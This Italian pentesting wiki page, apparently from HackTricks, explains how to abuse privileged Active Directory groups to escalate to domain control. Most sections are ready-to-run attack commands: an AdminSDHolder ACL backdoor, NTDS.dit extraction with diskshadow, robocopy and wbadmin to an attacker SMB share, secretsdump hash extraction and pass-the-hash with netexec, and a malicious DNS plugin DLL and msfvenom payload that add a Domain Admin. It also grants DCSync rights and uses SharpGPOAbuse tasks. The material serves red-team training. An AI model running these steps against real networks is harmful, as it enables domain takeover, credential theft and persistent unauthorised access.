# Gruppi privilegiati

{{#include ../../banners/hacktricks-training.md}}

## Gruppi noti con privilegi di amministrazione

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Questo gruppo è autorizzato a creare account e gruppi che non siano amministratori del dominio. Inoltre, consente l’accesso locale al Domain Controller (DC).

Per identificare i membri di questo gruppo, viene eseguito il seguente comando:

```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```

L'aggiunta di nuovi utenti è consentita, così come l'accesso locale al DC.<sup>[[1]](#references)</sup>

Un percorso condizionale dalla gestione degli account all'accesso come amministratore locale può passare da un **gruppo ordinario a cui è delegata la lettura della password LAPS di un computer**. Verifica i diritti effettivi di scrittura sull'appartenenza a quel gruppo specifico, se è protetto e se un account nuovo o controllato può effettivamente entrarvi. Aggiorna il token dell'account prima di testare i permessi di lettura LAPS sul computer di destinazione. Con Windows LAPS crittografato, i permessi di lettura nella directory e l'autorità di decrittazione della password sono requisiti distinti; l'appartenenza al gruppo o al gruppo Account Operators, da sola, non garantisce né l'uno né l'altro. Vedi [l'ambito di Account Operators descritto da Microsoft](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups) e [la delega di Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory).

## Gruppo AdminSDHolder

L'Access Control List (ACL) del gruppo **AdminSDHolder** è fondamentale, poiché imposta i permessi per tutti i "gruppi protetti" in Active Directory, inclusi quelli con privilegi elevati. Questo meccanismo garantisce la sicurezza di questi gruppi impedendo modifiche non autorizzate.

Un aggressore potrebbe sfruttare questa situazione modificando l'ACL del gruppo **AdminSDHolder** e concedendo autorizzazioni complete a un utente standard. In questo modo, l'utente otterrebbe il pieno controllo su tutti i gruppi protetti. Se i suoi permessi venissero modificati o rimossi, sarebbero ripristinati automaticamente entro un'ora, in base alla progettazione del sistema.<sup>[[14]](#references)</sup>

La documentazione recente di Windows Server considera ancora diversi gruppi di operatori predefiniti come oggetti **protetti** (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, ecc.). Il processo **SDProp** viene eseguito sul **PDC Emulator** ogni 60 minuti per impostazione predefinita, imposta `adminCount=1` e disabilita l'ereditarietà sugli oggetti protetti. Ciò è utile sia per la persistenza sia per individuare utenti privilegiati obsoleti, rimossi da un gruppo protetto ma ancora dotati di un'ACL che non eredita i permessi.<sup>[[12]](#references)</sup>

Comandi per esaminare i membri e modificare i permessi:

```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
  Select-Object distinguishedName
```

È disponibile uno script per accelerare il processo di ripristino: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Per ulteriori dettagli, visita [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).<sup>[[14]](#references)</sup>

## Cestino di AD

La visibilità degli oggetti eliminati è controllata dalle autorizzazioni effettive della directory; il nome di un gruppo, da solo, non dimostra che l'identità corrente possa elencare o ripristinare un oggetto. Per poter eseguire un ripristino completo, il Cestino di AD deve essere stato abilitato prima dell'eliminazione; il ripristino richiede inoltre il diritto Reanimate-Tombstones sulla radice del contesto dei nomi, i diritti di ridenominazione e CREATE_CHILD sul contenitore di destinazione. Le [indicazioni Microsoft sul Cestino](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin) e le [regole di autorizzazione per l'annullamento dell'eliminazione](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c7279698-8aed-4e0b-b750-97c29f11b004) distinguono queste condizioni. Un'identità autorizzata con accesso in lettura agli oggetti eliminati può esaminare record che potrebbero rivelare informazioni sensibili:

```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

Questo è utile per **recuperare i percorsi di privilegio precedenti**. Gli oggetti eliminati possono ancora esporre `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, vecchi SPN o il DN di un gruppo privilegiato eliminato, che in seguito può essere ripristinato da un altro operatore.

Gli attributi definiti dall'applicazione possono anche conservare vecchio materiale relativo alle credenziali mentre un oggetto è nello stato eliminato. Consideralo come una pista di indagine separata: l'identità corrente deve poter enumerare l'oggetto eliminato **e** leggere quell'attributo, il valore deve essere una credenziale utilizzabile e un principal ancora attivo deve accettarla. L'appartenenza a un gruppo o il solo nome di un account eliminato non dimostrano nessuno di questi passaggi; evita di stampare i valori delle credenziali durante l'enumerazione di routine. La [documentazione Microsoft sul Cestino](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin) descrive la conservazione degli attributi dopo l'eliminazione.

```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
  -Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
  Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```

### Accesso al Domain Controller

L'accesso ai file sul DC è limitato, a meno che l'utente non faccia parte del gruppo `Server Operators`, che modifica il livello di accesso.

### Escalation dei privilegi

Usando `PsService` o `sc` di Sysinternals, è possibile ispezionare e modificare le autorizzazioni dei servizi. Il gruppo `Server Operators`, ad esempio, ha il controllo completo su alcuni servizi, consentendo l'esecuzione di comandi arbitrari e l'escalation dei privilegi:<sup>[[1]](#references)</sup>

```cmd
C:\> .\PsService.exe security AppReadiness
```

Questo comando rivela che `Server Operators` dispone di accesso completo, consentendo la manipolazione dei servizi per ottenere privilegi elevati.

## Backup Operators

L'appartenenza a `Backup Operators` può concedere `SeBackupPrivilege` e `SeRestorePrivilege` su un host, a seconda dei criteri locali e della sessione di accesso. Verifica il **token effettivo del processo che esegue i comandi** con `whoami /groups` e `whoami /priv`: la sola appartenenza al gruppo non dimostra che `SeBackupPrivilege` sia presente e abilitato. Se il privilegio è presente ma disabilitato, potrebbe essere possibile abilitarlo in quel token; se è assente o è stato rimosso, queste operazioni di backup non possono utilizzarlo. `SeBackupPrivilege` supporta **letture** protette tramite API compatibili con il backup (ad esempio, `FILE_FLAG_BACKUP_SEMANTICS` o `robocopy /B`); `SeRestorePrivilege` è un privilegio distinto per le operazioni di ripristino/scrittura. I normali elenchi di directory e le copie non utilizzano necessariamente la semantica di backup.<sup>[[1]](#references)</sup>

Per elencare i membri del gruppo, esegui:

```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```

### Attacco locale

Su un host in cui il token effettivo dispone di `SeBackupPrivilege`, la seguente copia compatibile con i backup può leggere un file protetto:

1. Importa le librerie necessarie:

```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

2. Se il privilegio è presente ma disabilitato, abilitalo e verifica il suo stato in questo processo:

```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

3. Copia un file da una directory con accesso limitato, ad esempio:

```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```

### AD Attack

`NTDS.dit` è il database di Active Directory su un **domain controller (DC)**. Questo percorso richiede un token adeguato sul DC e l'accesso al volume che contiene il database; l'appartenenza al gruppo Backup Operators altrove non garantisce l'accesso a un DC specifico. Un database attivo è normalmente bloccato, quindi prima di copiarlo usa una shadow copy accessibile o un'altra funzionalità di backup. La creazione o l'esposizione di una shadow copy dipende anche dalla configurazione VSS dell'host e dai diritti del chiamante. L'esempio seguente presuppone che il DC archivi `NTDS.dit` su `C:` in `\Windows\NTDS`; modifica il volume e il percorso se necessario.

#### Usando diskshadow.exe

1. Se consentito, crea ed esponi una shadow copy dell'unità `C:` del DC come `F:`:

```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```

2. Copia `NTDS.dit` dalla shadow copy:

```cmd
mkdir C:\Tools
Copy-FileSeBackupPrivilege F:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

In alternativa, usa `robocopy` per copiare i file:

```cmd
robocopy /B F:\Windows\NTDS C:\Tools ntds.dit
```

3. Salva l'hive `SYSTEM` del DC per l'estrazione offline. `SAM` è il database degli account locali sui sistemi membri; l'hive `SAM` di un DC non sostituisce `NTDS.dit` né è una fonte dell'hash dell'Administrator di dominio:

```cmd
reg save HKLM\SYSTEM C:\Tools\SYSTEM.SAV
```

4. Trasferisci `ntds.dit` e `SYSTEM.SAV` sull'host di analisi ed estrai gli hash degli account di dominio. Un hive `SAM` salvato da un sistema membro, insieme al corrispondente hive `SYSTEM`, restituisce invece gli hash degli account locali:

```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
```

5. Se è stato recuperato da `NTDS.dit` l’hash di un **domain** Administrator, è possibile testarlo per l’autenticazione al dominio. Un hash di Administrator locale ottenuto da `SAM.SAV` è una credenziale diversa e non consente l’autenticazione come Administrator del dominio.<sup>[[11]](#references)</sup>

```bash
# Use the recovered domain Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```

#### Using wbadmin.exe

1. Configurare un filesystem NTFS per il server SMB sulla macchina attaccante e memorizzare nella cache le credenziali SMB sulla macchina target.
2. Usare `wbadmin.exe` per eseguire il backup del sistema ed estrarre `NTDS.dit`.
   ```cmd
   net use X: \\<AttackIP>\sharename /user:smbuser password
   echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
   wbadmin get versions
   echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
   ```

Per una dimostrazione pratica, guarda [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

I membri del gruppo **DnsAdmins** possono sfruttare i propri privilegi per caricare una DLL arbitraria con privilegi SYSTEM su un server DNS, spesso ospitato su Domain Controller. Questa capacità offre un notevole potenziale di sfruttamento.

Per elencare i membri del gruppo DnsAdmins, usa:

```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```

### Eseguire una DLL arbitraria (CVE‑2021‑40469)

> [!NOTE]
> Questa vulnerabilità consente di eseguire codice arbitrario con privilegi SYSTEM nel servizio DNS (solitamente all'interno dei DC). Il problema è stato corretto nel 2021.

I membri possono fare in modo che il server DNS carichi una DLL arbitraria (in locale o da una condivisione remota) usando comandi come:

```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
    system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
    system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```

Il riavvio del servizio DNS (che potrebbe richiedere autorizzazioni aggiuntive) è necessario affinché la DLL venga caricata:

```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```

Per ulteriori dettagli su questo vettore di attacco, consulta ired.team.

#### Mimilib.dll

È inoltre possibile usare mimilib.dll per eseguire comandi, modificandolo per eseguire comandi specifici o reverse shell. [Consulta questo post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) per ulteriori informazioni.<sup>[[15]](#references)</sup>

### Record WPAD per MitM

I DNSAdmins possono manipolare i record DNS per eseguire attacchi Man-in-the-Middle (MitM), creando un record WPAD dopo aver disabilitato la global query block list. È possibile usare strumenti come Responder o Inveigh per effettuare spoofing e catturare il traffico di rete.

### Event Log Readers
I membri possono accedere ai log degli eventi e potenzialmente trovare informazioni sensibili, come password in chiaro o dettagli sull'esecuzione di comandi:

```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```

## Exchange Windows Permissions

Questo gruppo può modificare le DACL dell’oggetto dominio, ottenendo potenzialmente i privilegi DCSync. Le tecniche di privilege escalation che sfruttano questo gruppo sono descritte nel repository GitHub Exchange-AD-Privesc.

```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```

Se puoi agire come membro di questo gruppo, l’abuso classico consiste nel concedere a un’identità controllata dall’attaccante i diritti di replica necessari per [DCSync](dcsync.md):

```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```

Storicamente, **PrivExchange** concatenava l'accesso alle mailbox, l'autenticazione Exchange forzata e il relay LDAP per ottenere questo stesso primitivo. Anche quando quel percorso di relay è mitigato, l'appartenenza diretta a `Exchange Windows Permissions` o il controllo di un server Exchange rimangono una strada di grande valore per ottenere i diritti di replica del dominio.

## Hyper-V Administrators

Gli Hyper-V Administrators hanno accesso completo a Hyper-V, che può essere sfruttato per ottenere il controllo dei Domain Controller virtualizzati. Questo include la clonazione di DC attivi e l'estrazione di hash NTLM dal file NTDS.dit.

### Esempio di exploit

In genere, l'abuso pratico consiste nell'**accesso offline ai dischi/checkpoint dei DC**, piuttosto che nei vecchi trucchi LPE a livello host. Con l'accesso all'host Hyper-V, un operatore può creare un checkpoint o esportare un Domain Controller virtualizzato, montare il VHDX ed estrarre `NTDS.dit`, `SYSTEM` e altri segreti senza interagire con LSASS all'interno della macchina guest:

```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```

From there, riutilizza il workflow `Backup Operators` per copiare offline `Windows\NTDS\ntds.dit` e gli hive del registro. Workflow correlato per i file di backup:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

## Group Policy Creators Owners	

Questo gruppo consente ai membri di creare Group Policy nel dominio. Tuttavia, i suoi membri non possono applicare Group Policy a utenti o gruppi, né modificare GPO esistenti.

La sfumatura importante è che **chi crea una nuova GPO ne diventa il proprietario** e di solito ottiene diritti sufficienti per modificarla in seguito. Questo significa che il gruppo è interessante quando puoi:

- creare una GPO malevola e convincere un admin a collegarla a una OU o a un dominio di destinazione
- modificare una GPO che hai creato e che è già collegata in una posizione utile
- abusare di un altro diritto delegato che consente di collegare GPO, mentre questo gruppo ti dà i diritti per modificarle

In pratica, l'abuso consiste normalmente nell'aggiungere tramite i file di policy supportati da SYSVOL un'**Immediate Task**, uno **startup script**, l'appartenenza agli **admin locali** o una modifica all'assegnazione dei **user rights**.<sup>[[3]](#references)[[4]](#references)[[13]](#references)[[16]](#references)</sup>

```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```

Se modifichi manualmente il GPO tramite `SYSVOL`, ricorda che la modifica da sola non è sufficiente: occorre aggiornare anche `versionNumber`, `GPT.ini` e, talvolta, `gPCMachineExtensionNames`, altrimenti i client ignoreranno l'aggiornamento dei criteri.<sup>[[9]](#references)</sup>

## Organization Management

Negli ambienti in cui è distribuito **Microsoft Exchange**, un gruppo speciale noto come **Organization Management** dispone di capacità significative. Questo gruppo ha i privilegi per **accedere alle mailbox di tutti gli utenti del dominio** e mantiene il **controllo completo sull'unità organizzativa (OU) 'Microsoft Exchange Security Groups'**. Questo controllo include il gruppo **`Exchange Windows Permissions`**, che può essere sfruttato per l'escalation dei privilegi.

### Sfruttamento dei privilegi e comandi

#### Print Operators

I membri del gruppo **Print Operators** dispongono di diversi privilegi, tra cui **`SeLoadDriverPrivilege`**, che consente loro di **accedere localmente a un Domain Controller**, spegnerlo e gestire le stampanti. Per sfruttare questi privilegi, soprattutto se **`SeLoadDriverPrivilege`** non è visibile in un contesto non elevato, è necessario aggirare User Account Control (UAC).<sup>[[1]](#references)</sup>

Per elencare i membri di questo gruppo, si usa il seguente comando PowerShell:

```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```

Sui Domain Controller questo gruppo è pericoloso perché la policy predefinita dei Domain Controller assegna **`SeLoadDriverPrivilege`** a `Print Operators`. Se ottieni un token con privilegi elevati per un membro di questo gruppo, puoi abilitare il privilegio e caricare un driver firmato ma vulnerabile per ottenere l'accesso al kernel/SYSTEM.<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)[[17]](#references)</sup> Per i dettagli sulla gestione dei token, consulta [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Remote Desktop Users

I membri di questo gruppo ottengono l'accesso ai PC tramite Remote Desktop Protocol (RDP). Per enumerare questi membri, sono disponibili comandi PowerShell:

```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```

Ulteriori approfondimenti sullo sfruttamento di RDP sono disponibili in risorse dedicate al pentesting.

#### Utenti di Gestione remota

I membri possono accedere ai PC tramite **Windows Remote Management (WinRM)**. L'enumerazione di questi membri si effettua tramite:

```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```

Per le tecniche di exploitation relative a **WinRM**, è necessario consultare la documentazione specifica.

#### Server Operators

Questo gruppo dispone delle autorizzazioni per eseguire varie configurazioni sui Domain Controller, tra cui i privilegi di backup e ripristino, la modifica dell'ora di sistema e l'arresto del sistema.<sup>[[1]](#references)</sup> Per enumerarne i membri, viene fornito il comando seguente:

```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```

Sui Domain Controller, i `Server Operators` ereditano spesso diritti sufficienti per **riconfigurare i servizi o avviarli/arrestarli** e ricevono anche `SeBackupPrivilege`/`SeRestorePrivilege` tramite i criteri predefiniti dei DC. In pratica, questo li rende un ponte tra l'**abuso del controllo dei servizi** e l'estrazione di **NTDS**:

```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```

Il fatto di non riuscire a elencare i servizi non esclude l'accesso a un **servizio noto**. Service Control Manager verifica `SC_MANAGER_ENUMERATE_SERVICE` per l'elenco separatamente da `SC_MANAGER_CONNECT`; l'apertura di un servizio specifico verifica i relativi diritti, tra cui `SERVICE_CHANGE_CONFIG` e `SERVICE_START`. Esamina il token effettivo e l'ACL del servizio anche quando un `sc.exe query` generico non funziona. I soli diritti di configurazione sono soltanto un possibile indizio: l'identità del servizio, i diritti di avvio/arresto e la disponibilità di un trigger utilizzabile determinano comunque se sia possibile una transizione a privilegi superiori. Vedi il [riferimento di Microsoft sui diritti di accesso ai servizi](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Se l'ACL di un servizio concede a questo gruppo i diritti di modifica/avvio, imposta il servizio affinché esegua un comando arbitrario, avvialo come `LocalSystem` e poi ripristina il `binPath` originale. Se il controllo dei servizi è bloccato, ricorri alle tecniche di `Backup Operators` sopra descritte per copiare `NTDS.dit`.

## References

- [1] [ired.team – Account privilegiati e privilegi dei token](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – Abuso di SeLoadDriverPrivilege per l'escalation dei privilegi](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – Abuso dei permessi GPO](https://blog.harmj0y.net/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – Abuso delle GPO, parte 1 (Internet Archive)](https://web.archive.org/web/20190416075109/https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – Guida di un red team alle GPO e alle OU](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Microsoft Learn – Funzione ZwLoadDriver](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwloaddriver)
- [11] [HTB: Baby — LDAP anonimo → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – Appendice C: account e gruppi protetti in Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – Come abusare di AdminSDHolder e installarvi una backdoor per ottenere persistenza come Domain Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – Abuso del privilegio DnsAdmins per l'escalation in Active Directory](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
- [16] [BloodHound – Informazioni sull'abuso dell'edge GenericAll](https://bloodhound.specterops.io/resources/edges/generic-all)
- [17] [Undocumented NT Internals – Funzione NtLoadDriver (Internet Archive)](https://web.archive.org/web/20200313000124/http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
{{#include ../../banners/hacktricks-training.md}}
